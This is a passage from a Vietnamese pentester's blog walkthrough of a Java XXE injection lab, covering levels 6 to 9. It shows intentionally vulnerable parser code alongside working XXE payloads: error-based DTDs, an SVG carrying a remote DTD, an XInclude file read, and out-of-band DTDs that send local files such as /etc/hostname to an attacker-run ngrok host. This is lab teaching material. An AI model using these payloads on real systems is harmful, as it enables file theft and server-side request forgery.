<p>Ta để ý rằng dòng <code>dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, true</code> đã mở đường cho phép các lệnh như <code>SYSTEM</code> được chạy bình thường và điều này gây nên XXE injection. Nhưng ở đây nó có thay đổi ở đoạn trả về lỗi nó sẽ trả về thông điệp kèm theo lý do lỗi,</p>
<p>Tuy có thay đổi về code nhưng cách khai thác vẫn có lẽ sẽ không khác gì với level 6 vì ta vẫn có thể Error Based XXE được.</p>
<p><img src="https://hackmd.io/_uploads/ryPzNyv3ll.png" alt="image"></p>
<p>Test lại với payload cũ thì phần error sẽ vẫn kèm theo nội dung của câu payload gắn trong webhook.</p>
<h4 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7:"></a>Level 7:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">parseSvg</span><span class="params">(String svgContent)</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> createVulnerableBuilder().parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(svgContent)));</span><br><span class="line">           <span class="comment">// Simulate rendering the SVG, which might trigger the XXE</span></span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;SVG file processed. It contains &quot;</span> + doc.getElementsByTagName(<span class="string">&quot;*&quot;</span>).getLength() + <span class="string">&quot; elements.&quot;</span>;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Error processing SVG: &quot;</span> + e.getMessage();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Vector Tấn Công: Không còn là một payload XML thô nữa. Lần này, server mong đợi nhận được nội dung của một file SVG (Scalable Vector Graphics). Điều may mắn là SVG về bản chất chính là một file XML. Điều này có nghĩa là chúng ta có thể nhúng payload DTD độc hại của mình vào bên trong một file SVG hợp lệ.</li>
<li>Cửa Ngõ XXE: Hàm createVulnerableBuilder() vẫn còn đó, đảm bảo rằng nếu chúng ta đưa một DTD vào, nó sẽ được xử lý.</li>
</ul>
<p>Với suy nghĩ của tôi chắc là nên tận dụng thử payload của level 6 với level này xem liệu nó sẽ trả về gì vì đây là chức năng upload file SVG.</p>
<p>Đầu tiên ta vẫn sẽ tạo url trong webhook với <code>application/xml</code> với nội dung là:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>

<p>Sau đó thì tạo file <code>payload.svg</code> với nội dung:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://webhook.site/08d61cbd-3978-4049-8c79-387217b982f1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;100&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;100&quot;</span> <span class="attr">r</span>=<span class="string">&quot;80&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Sau đó ta sẽ tiến hành upload xem nội dung nó trả về sẽ là gì.</p>
<p><img src="https://hackmd.io/_uploads/SJhH_1v2gg.png" alt="image"></p>
<p>Có vẻ payload đã thành công đưa ra kết quả.</p>
<h4 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8:"></a>Level 8:</h4><p>Ở level này ta sẽ tìm ra được cách tấn công mới hơn.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">parseLevel8</span><span class="params">(String xml)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">          <span class="comment">// DTDs are disabled, but XInclude is enabled!</span></span><br><span class="line">          dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">          dbf.setXIncludeAware(<span class="literal">true</span>); <span class="comment">// The vulnerability!</span></span><br><span class="line">          dbf.setNamespaceAware(<span class="literal">true</span>); <span class="comment">// Required for XInclude</span></span><br><span class="line"></span><br><span class="line">          <span class="type">DocumentBuilder</span> <span class="variable">dBuilder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">          <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> dBuilder.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml)));</span><br><span class="line">          <span class="keyword">return</span> <span class="string">&quot;XInclude Parsed: &quot;</span> + doc.getDocumentElement().getTextContent();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="string">&quot;Error: &quot;</span> + e.getMessage();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>disallow-doctype-decl&quot;, true</code>: Dòng này vô hiệu hóa hoàn toàn <!DOCTYPE ...>. Tất cả các payload dựa trên DTD (<!ENTITY ...>) của chúng ta từ Level 1 đến 7 đều trở nên vô dụng. Server sẽ báo lỗi ngay nếu thấy DOCTYPE.</li>
<li><code>setXIncludeAware(true)</code>: Đây là lỗ hổng mới! XInclude (XML Inclusions) là một tính năng tiêu chuẩn của XML, cho phép một file XML nhúng (include) nội dung của một file khác vào bên trong nó. Khi bật tính năng này mà không có kiểm soát, nó sẽ hoạt động y hệt như XXE: đọc file cục bộ hoặc thực hiện request ra bên ngoài.</li>
<li><code>doc.getDocumentElement().getTextContent()</code>: Đây là kênh rò rỉ dữ liệu In-band! Server không chỉ xử lý file được include, mà còn lấy nội dung text của nó (getTextContent()) và trả về trực tiếp cho chúng ta. Đây là kịch bản khai thác dễ nhất, không cần dùng đến error-based hay out-of-band.</li>
</ul>
<p>Kịch bản ở đây ta sẽ lợi dụng XML Inclusion để tiến hành tấn công khai thác thử level này.</p>
<p>Chúng ta sẽ tạo một payload XML đơn giản sử dụng cú pháp của XInclude để đọc file <code>win.ini</code>.</p>
<p>Cú pháp của XInclude gồm 2 phần:</p>
<ul>
<li>Khai báo namespace: xmlns:xi&#x3D;”<a target="_blank" rel="noopener" href="http://www.w3.org/2001/XInclude">http://www.w3.org/2001/XInclude</a>“<br>Thẻ include: &lt;xi:include href&#x3D;”URI_CẦN_ĐỌC” parse&#x3D;”text”&#x2F;&gt;<br>href: Đường dẫn đến file cần đọc.</li>
<li>parse&#x3D;”text”: Cực kỳ quan trọng. Nó bảo parser hãy coi nội dung file là văn bản thô, đừng cố phân tích nó như XML (vì win.ini không phải là XML).</li>
</ul>
<p>Ta sẽ có 1 payload như này:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;file:///C:/Windows/win.ini&quot;</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Tiến hành inject vào.</p>
<p><img src="https://hackmd.io/_uploads/HyAg9Jv2le.png" alt="image"></p>
<p>Thành công khai thác level 8.</p>
<h4 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9:"></a>Level 9:</h4><p>Đến với level 9 thì bây giờ sẽ là challenge thuần blind khi mà sau khi parse sẽ không trả về kết quả và sẽ không báo lỗi nữa.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">parseLevel9</span><span class="params">(String xml)</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           createVulnerableBuilder().parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml)));</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Request processed.&quot;</span>;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="comment">// Lỗi bị &quot;nuốt&quot;, chỉ trả về thông báo chung chung</span></span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Request processed.&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>Nhưng ở đây sẽ vẫn tồn tại lỗ hổng tại vì vẫn sử dụng <code>createVulnerableBuilder()</code> nên hoàn toàn có thể tìm cách để thay vì đưa được output hiển thị ở lỗi như level 5,6 thì ta có thể thử sử dụng OOB (Out Of Band). Với mục đích đưa được output ra bên ngoài vì ở đây phần result không hiển thị rõ kết quả vè eror cũng bị chặn hết nên ta sẽ không thể error based nữa.</p>
<p>Sau khi tham khảo các nguồn thì tôi sẽ thử OOB trường hợp này mình sẽ gửi result ra bằng http liệu xem nó sẽ trả về cái gì.</p>
<p><img src="https://hackmd.io/_uploads/Sk-vgCo3xx.png" alt="image"></p>
<p>Tiến hành host 1 python server đến port 8000 ở folder mà ta để payload.</p>
<p><img src="https://hackmd.io/_uploads/BkZqlConee.png" alt="image"></p>
<p>Sử dụng ngrok để listen port 8000 và tạo tunnel đưa nó ra ngoài.</p>
<p><img src="https://hackmd.io/_uploads/Sk8TxAj3lx.png" alt="image"></p>
<p>Tạo file exploit.dtd với nội dung trên:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/system.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;https://eparchial-dahlia-edgier.ngrok-free.dev/?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/Sk3yG0i2gx.png" alt="image"></p>
<p>Tiến hành payload cho ngrok trỏ đến file và khi nó get về nó sẽ thực thi file dtd và mong nó sẽ trả result trong request.</p>
<p><img src="https://hackmd.io/_uploads/rkx07fCo2lx.png" alt="image"></p>
<p>Có vẻ như thành công GET file nhưng không hề có thông tin nào được trả về. Ở đây sau khi thử vài cách về đọc file nhưng không hề được thì mình đang nghĩ là do cấu hình Spring không cho phép thực thì dtd đọc file nên mình sẽ thử cách khác là SSRF bằng cách thử ping.</p>
<p>Vẫn như trên ta sẽ tạo python server sau đó đưa nó qua ngrok listen sau đó tạo file ping.dtd với nội dung:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">ping</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://eparchial-dahlia-edgier.ngrok-free.dev/ping-successful&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Payload này sẽ cố đọc ping.dtd, server lab hiểu lệnh bên trong (<!ENTITY % ping SYSTEM ".../ping-successful">) và đã thực thi nó. Nó sẽ gửi đi một request thứ hai đến địa chỉ &#x2F;ping-successful.</p>
<p><img src="https://hackmd.io/_uploads/ryENSAj3gl.png" alt="image"></p>
<p>Ta có kết quả sau khi tiến hành sử dụng payload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">oob</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://eparchial-dahlia-edgier.ngrok-free.dev/ping.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %oob;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %ping;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>test<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>1. ::1 - - [02&#x2F;Oct&#x2F;2025 17:29:25] “GET &#x2F;ping.dtd HTTP&#x2F;1.1” 200 -</strong></p>
<ul>
<li>Ý nghĩa: Server lab đã kết nối đến server python và tải thành công file ping.dtd. Status 200 có nghĩa là “OK”.</li>
</ul>
<p><strong>2. ::1 - - [02&#x2F;Oct&#x2F;2025 17:29:25] “GET &#x2F;ping-successful HTTP&#x2F;1.1” 404 -</strong></p>
<ul>
<li>Ý nghĩa: Đây là dòng quan trọng nhất. Sau khi đọc ping.dtd, server lab đã hiểu lệnh bên trong (<!ENTITY % ping SYSTEM ".../ping-successful">) và đã thực thi nó. Nó đã gửi đi một request thứ hai đến địa chỉ &#x2F;ping-successful.</li>
</ul>
<p>Tại sao lại là 404? Vì trên server python không hề có file nào tên là ping-successful. Server python trả về lỗi “404 File Not Found” là hoàn toàn đúng.</p>
<ul>
<li>Kết luận: Thành công sử dụng XXE để thực thi Blind SSRF vì ta có thể thấy xml payload trong ping.dtd vẫn được thực thi và trỏ đến xem có file <code>/ping-successful</code> không và từ đó có thể thấy xml trong đoạn vẫn được thực thi nhưng ở đây có khả năng cao do cấu hình của Spring không còn cho phép thực thi các lệnh như <code>file</code> nên không đọc file được.</li>
</ul>
<p>Bây giờ nếu windows không được ta sẽ chuyển sang thử môi trường linux để xem liệu có chạy được không.</p>
<p><img src="https://hackmd.io/_uploads/HJlA5Mhhgx.png" alt="image"></p>
<p>Host python server lên.</p>
<p><img src="https://hackmd.io/_uploads/Bkhzof23xx.png" alt="image"></p>
<p>Tạo file <code>exploit-linux.dtd</code> với nội dung:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/hostname&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;https://eparchial-dahlia-edgier.ngrok-free.dev/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;        </span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">Payload này sẽ giúp ta đọc dữ liệu của file `/etc/hostname`.</span><br><span class="line"></span><br><span class="line">Bây giờ ta sẽ bỏ payload vào trong level 9 để xem dữ liệu trả về ra sao.</span><br><span class="line"></span><br><span class="line">```xml</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">oob</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:8000/exploit-linux.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %oob;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>go<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/HJwW6gp2xl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HyxM3z2ngl.png" alt="image"></p>
<p>Thành công đọc được file hostname.</p>
<p><img src="https://hackmd.io/_uploads/r164hz33lx.png" alt="image"></p>
<p>Từ đây tôi khá chắc là nếu file hostname thành công mà những file dài không có kết quả thì khả năng cao là nếu file quá dài và nhiều kí tự thì sẽ khó để mà đọc được nên khả năng nếu sử dung ftp protocol thì khả năng cao sẽ có thể đọc được những file dài.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/11/15/2025-09-28-XXE-Injection/">https://pzhat.github.io/2025/11/15/2025-09-28-XXE-Injection/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/15/2025-10-06-NoSQL-Injection-Lab/" title="NoSQL Injection Vulnerability Challenge Java"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">NoSQL Injection Vulnerability Challenge Java</div></div><div class="info-2"><div class="info-item-1">NoSQL Injection Vulnerability Challenge JavaTổng quan về NoSQL Injection Tấn công NoSQL injection là một lỗ hổng bảo mật trong các ứng dụng web sử dụng cơ sở dữ liệu NoSQL. NoSQL (viết tắt của “Not Only SQL”) là các hệ thống cơ sở dữ liệu không sử dụng ngôn ngữ truy vấn có cấu trúc SQL, mà thay vào đó dùng các định dạng dữ liệu linh hoạt hơn như cặp khóa-giá trị, tài liệu (document), hoặc đồ thị dữ liệu.  Tương tự như SQL injection, NoSQL injection cho phép kẻ tấn công vượt qua xác thực, đánh...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-23-SSRF-Challenge/" title="Server Side Request Forgery (Java)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Server Side Request Forgery (Java)</div></div><div class="info-2"><div class="info-item-1">Server Side Request Forgery (Java)Source CodeGithub: https://github.com/pzhat/SSRF_vuln_demo What is SSRFGiới thiệu về Server-Side Request Forgery :  Chúng ta có xu hướng lơ là, mất cảnh giác khi đang trong vùng an toàn  → Developer nghĩ rằng hacker sẽ không truy cập được các ứng dụng nội bộ do đó việc bị hack gần như là không thể → Pentester cũng không đủ thời gian để security test hết tất cả dịch vụ nội bộ → Khả năng tìm ra lỗi trên các dịch vụ nội bộ sẽ rất cao nếu ”lẻn” vào được bên trong...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-09-09-Cookie-Arena-Cmdi/" title="Cookie Arena Challenges WU (@Phatmh)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Cookie Arena Challenges WU (@Phatmh)</div></div><div class="info-2"><div class="info-item-1">Cookie Arena Web Challenges WriteUp by (@Phatmh)NSLookup (Level 1)Đây là một Website có chức năng là nslookup sử dụng hàm shell_exec của php để thực thi. Ta tiến hành truy cập để xem giao diện của web app.Ở đây ta thấy nó khá là basic khi chỉ có duy nhất một nơi có chức năng nslookup và bên cạnh là source code cho sẵn của chall, ta sẽ tiến hành phân tích source code được cấp sẵn. Ở ngay đầu tiên ta gặp khởi tạo và include file design và tạo object ($design) có tên là NSLookup Tool. Đến với nh...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Cmdi/" title="Java Servlet Command Injection Vulnerability Challenges"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Command Injection Vulnerability Challenges</div></div><div class="info-2"><div class="info-item-1">Java Servlet Command Injection Vulnerability ChallengesCấu trúc Project Cấu trúc Project   1234567891011121314151617181920212223242526272829303132333435+---.idea+---.mvnª   +---wrapper+---srcª   +---mainª   ª   +---javaª   ª   ª   +---ciª   ª   ª       +---controllerª   ª   ª       +---serviceª   ª   ª       +---utilª   ª   +---resourcesª   ª   ª   +---META-INFª   ª   +---webappª   ª       +---WEB-INFª   +---testª       +---javaª       +---resources+---target    +---classes    ª   +---ci    ª...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-FileUpload-Servlet/" title="Java Servlet FileUpload Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet FileUpload Vulnerability</div></div><div class="info-2"><div class="info-item-1">Java Servlet FileUpload Vulnerability by @PhatmhLỗ hổng File UploadBản chất của File Upload: File Upload đối với tôi nó đơn giản chỉ là lợidụng Unsafe Method để truyền một Untrusted Data vào nhằm thay đổi hànhvi của hệ thống trong trường hợp này là Web App, với FileUpload những gìUser Upload lên sẽ chính là Untrusted Data và với Feature Upload Filenhư này sẽ thế nào nếu nó không được Validate một cách cẩn thận ta sẽđến với DEMO bằng Java Servlet. Web App OverviewĐây là một Web App được dựng v...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-16-WebSec.fr-level28/" title="WebSec.fr Level 28 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr Level 28 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr Level 28 CTF challengeTổng quan: 1234567891011121314151617181920212223&lt;?phpif(isset($_POST[&#x27;submit&#x27;])) &#123;  if ($_FILES[&#x27;flag_file&#x27;][&#x27;size&#x27;] &gt; 4096) &#123;    die(&#x27;Your file is too heavy.&#x27;);  &#125;  $filename = &#x27;./tmp/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;.php&#x27;;  $fp = fopen($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;], &#x27;r&#x27;);  $flagfilecontent = fread($fp, filesize($_FILES[&#x27;flag_file...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Sql-Injection/" title="Java Servlet Sql Injection Vulnerability by @Phatmh"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Sql Injection Vulnerability by @Phatmh</div></div><div class="info-2"><div class="info-item-1">Java Servlet Sql Injection Vulnerability by @PhatmhTổng quan cấu trúc file java123456789101112131415161718192021222324252627282930313233343536373839+---.idea   +---dataSources+---.mvn   +---wrapper+---src   +---main      +---java         +---sql_injection             +---controller             +---dao             +---model             +---util      +---resources         +---META-INF      +---webapp          +---WEB-INF   +---test       +---java       +---resources+---target    +---classes    ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">Pentester/Redteam</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/pzhat"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/pzhat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/phat-mai-hong-2580a52aa/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0A66C2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Blog about cybersecurity, hacking, pentesting, red teaming and more...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE-Injection-Vulnerability-Lab"><span 